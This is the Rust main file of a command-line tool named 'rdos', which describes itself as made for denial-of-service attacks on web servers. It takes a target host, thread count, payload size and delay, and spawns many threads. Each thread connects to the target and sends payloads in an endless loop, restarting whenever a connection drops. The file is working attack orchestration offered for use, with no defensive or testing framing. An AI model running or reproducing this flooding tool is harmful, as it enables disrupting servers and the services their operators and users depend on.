use std::thread;

use clap::{Arg, Command};
use ipv4_spec::IPv4Spec;
use worker::TcpWorker;

mod ipv4_spec;
mod worker;

fn main() {
    // Initialize arg parse tree
    let cmd = Command::new("rdos")
        .version("1.0")
        .about("rdos is a tool made for DOS attacks on web servers.")
        .arg(
            Arg::new("target")
                .required(true)
                .help("The target host. Examples: 127.0.0.1:80, mywebsite.com:80"),
        )
        .arg(
            Arg::new("threads")
                .required(false)
                .short('t')
                .long("threads")
                .default_value("64")
                .help("The size of the thread pool."),
        )
        .arg(
            Arg::new("size")
                .required(false)
                .short('s')
                .long("size")
                .default_value("64")
                .help("The size of the payloads."),
        )
        .arg(
            Arg::new("delay")
                .required(false)
                .short('d')
                .long("delay")
                .default_value("200")
                .help("The delay in miliseconds between sending the next payload."),
        );

    // Get matches from input args
    let matches = cmd.get_matches();

    // Set init params
    let target = matches
        .get_one::<String>("target")
        .expect("Target is required.");

    let thread_count = matches
        .get_one::<String>("threads")
        .unwrap()
        .parse::<usize>()
        .expect("Threads must be a number of type usize");

    let payload_size = matches
        .get_one::<String>("size")
        .unwrap()
        .parse::<usize>()
        .expect("Size must be a number of type usize");

    let delay_ms = matches
        .get_one::<String>("delay")
        .unwrap()
        .parse::<usize>()
        .expect("Delay must be a number of type usize");

    // parse target IP to IPv4Spec struct
    let ip_address = ipv4_spec::IPv4Spec::parse(target.to_string()).unwrap();

    // Run the application
    run(ip_address, thread_count, payload_size, delay_ms);
}

fn run(ip_address: IPv4Spec, thread_count: usize, payload_size: usize, delay_ms: usize) {
    println!(
        "Connecting to: {}:{}",
        ip_address.get_host(),
        ip_address.get_port()
    );

    // Init the vec that holds the threads
    let mut thread_pool = Vec::new();

    // Spawn threads and add thread to thread_pool vec
    for _ in 0..thread_count {
        // This is done because move takes ownership of ip_address.
        // Now each thread has it's own IPv4Spec with which it can do what it wants.
        let ip_clone = ip_address.clone();

        let thread = thread::spawn(move || run_worker(ip_clone, payload_size, delay_ms));
        thread_pool.push(thread);
    }

    // This code should never finish, because workers should never stop sending data.
    // If a worker crashes it should restart itself.
    for thread in thread_pool {
        thread.join().expect("Thread could not finish correctly.");
    }
}

fn run_worker(ip_address: IPv4Spec, payload_size: usize, delay_ms: usize) {
    let err_msg = format!(
        "Failed to connect to {}:{}",
        ip_address.get_host(),
        ip_address.get_port()
    );

    // Init TcpWorker, this also uses TcpStream::connect().
    let mut worker = TcpWorker::new(ip_address.clone(), payload_size).expect(err_msg.as_str());
    println!("Worker connected. Starting DOS.");

    loop {
        // If the worker is finished, it will restart its internal TcpStream
        if worker.finished() {
            println!("Worker disconnected. Restarting.");

            // ip_address is cloned and the clone is destroyed in this iteration.
            // This way we can keep using the ip_address from the caller.
            _ = worker.restart(ip_address.clone());
        }

        worker.work(); // If the worker crashes it sets its internal is_finished to true.
        worker.sleep(delay_ms); // Calls internal thread::sleep();
    }
}
